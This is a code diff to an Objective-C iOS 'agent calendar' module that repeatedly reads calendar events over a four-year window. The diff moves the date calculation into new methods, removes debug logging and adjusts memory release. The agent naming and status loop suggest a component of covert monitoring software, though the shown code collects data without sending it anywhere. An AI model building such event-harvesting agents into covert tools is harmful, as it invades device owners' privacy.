@@ -87,6 +87,65 @@ NSDate *gStartDate, *gEndDate;
   return sharedAgentCalendar;
 }
 
+- (NSDate*)initStartDate
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  CFGregorianDate gregorianStartDate;
+  CFGregorianUnits startUnits = {0, 0, -730, 0, 0, 0};
+  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();
+  
+  gregorianStartDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
+                                                                                      timeZone, 
+                                                                                      startUnits),
+                                                      timeZone);
+  gregorianStartDate.hour = 0;
+  gregorianStartDate.minute = 0;
+  gregorianStartDate.second = 0;
+  
+  
+  NSDate *theDate =
+  [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianStartDate, timeZone)];
+  
+  [theDate retain];
+  
+  CFRelease(timeZone);
+  
+  [pool release];
+  
+  return theDate;
+}
+
+- (NSDate*)initEndDate
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  CFGregorianDate gregorianEndDate;
+  CFGregorianUnits endUnits = {0, 0, 730, 0, 0, 0};
+  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();
+  
+  
+  gregorianEndDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
+                                                                                    timeZone, 
+                                                                                    endUnits),
+                                                    timeZone);
+  gregorianEndDate.hour = 0;
+  gregorianEndDate.minute = 0;
+  gregorianEndDate.second = 0;
+
+  NSDate *theDate =
+  [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianEndDate, timeZone)];
+  
+  [theDate retain];
+  
+  CFRelease(timeZone);
+  
+  [pool release];
+  
+  return theDate;
+  
+}
+
 - (void)calcStartAndEndDate
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -96,8 +155,7 @@ NSDate *gStartDate, *gEndDate;
   CFGregorianUnits endUnits = {0, 0, 730, 0, 0, 0};
   CFTimeZoneRef timeZone = CFTimeZoneCopySystem();
 
-  gregorianStartDate = CFAbsoluteTimeGetGregorianDate(
-                                                      CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
+  gregorianStartDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                       timeZone, 
                                                                                       startUnits),
                                                       timeZone);
@@ -105,8 +163,7 @@ NSDate *gStartDate, *gEndDate;
   gregorianStartDate.minute = 0;
   gregorianStartDate.second = 0;
 
-  gregorianEndDate = CFAbsoluteTimeGetGregorianDate(
-                                                    CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
+  gregorianEndDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                     timeZone, 
                                                                                     endUnits),
                                                     timeZone);
@@ -288,16 +345,12 @@ NSDate *gStartDate, *gEndDate;
 
   NSArray *events = [eStore eventsMatchingPredicate: predicate];
 
-#ifdef  DEBUG
-  NSLog(@"%s: events Array %@",__FUNCTION__, events);
-#endif
-
   [eStore release];
 
   return events;
 }
 
-- (void)parseCalEvents: (BOOL)allEvents
+- (void)parseCalEvents: (BOOL)allEvents withStartDate:(NSDate*)startDate andEndDate:(NSDate*)endDate
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
@@ -309,26 +362,14 @@ NSDate *gStartDate, *gEndDate;
 
   if ([majVer compare: @"3"] == NSOrderedSame) 
     {
-#ifdef DEBUG_CAL
-      NSLog(@"%s: not supported iOS", __FUNCTION__);
-#endif
       [pool release];
       return;
     }
 
-#ifdef DEBUG_CAL
-  NSLog(@"%s: startDate %@, endDate %@", __FUNCTION__, gStartDate, gEndDate);
-#endif
-
-  NSArray *events = [self getEvents: gStartDate toDate: gEndDate];
+  NSArray *events = [self getEvents: startDate toDate: endDate];
 
   if (events) 
     {
-
-#ifdef DEBUG_CAL
-      NSLog(@"%s: num of events %d", __FUNCTION__, [events count]);
-#endif
-
       for (int i=0; i < [events count]; i++) 
         {
           EKEvent *currEvent = (EKEvent*)[events objectAtIndex: i];
@@ -348,13 +389,12 @@ NSDate *gStartDate, *gEndDate;
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  NSDate *startDate, *endDate;
 
-#ifdef DEBUG_CAL
-  NSLog(@"%s: Agent calendar started", __FUNCTION__);
-#endif
-
-  [self calcStartAndEndDate];
-
+  //[self calcStartAndEndDate];
+  startDate = [self initStartDate];
+  endDate   = [self initEndDate];
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
 
   [self _getAgentMessagesProperty];
@@ -362,7 +402,7 @@ NSDate *gStartDate, *gEndDate;
   if (mLastEvent == 0) 
     {
       mLastEvent = [[NSDate dateWithTimeIntervalSince1970:0] timeIntervalSince1970];
-      [self parseCalEvents: YES];
+      [self parseCalEvents: YES withStartDate:startDate andEndDate:endDate];
     }
 
   while([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
@@ -370,7 +410,7 @@ NSDate *gStartDate, *gEndDate;
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
 
-      [self parseCalEvents: NO];
+      [self parseCalEvents: NO withStartDate:startDate andEndDate:endDate];
 
       for (int i=0; i<20; i++) 
         {
@@ -392,9 +432,12 @@ NSDate *gStartDate, *gEndDate;
   [mAgentConfiguration setObject: AGENT_STOPPED
                           forKey: @"status"];
 
-  [gStartDate release];
-  [gEndDate release];
+  [startDate release];
+  [endDate release];
 
+  [mAgentConfiguration release];
+  mAgentConfiguration = nil;
+  
   [outerPool release];
 }
 
@@ -424,15 +467,6 @@ NSDate *gStartDate, *gEndDate;
 #pragma mark -
 #pragma mark Getter/Setter
 #pragma mark -
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
-  if (aConfiguration != mAgentConfiguration)
-    {
-      [mAgentConfiguration release];
-      mAgentConfiguration = [aConfiguration retain];
-    }
-}
 
 - (NSMutableDictionary *)mAgentConfiguration
 {
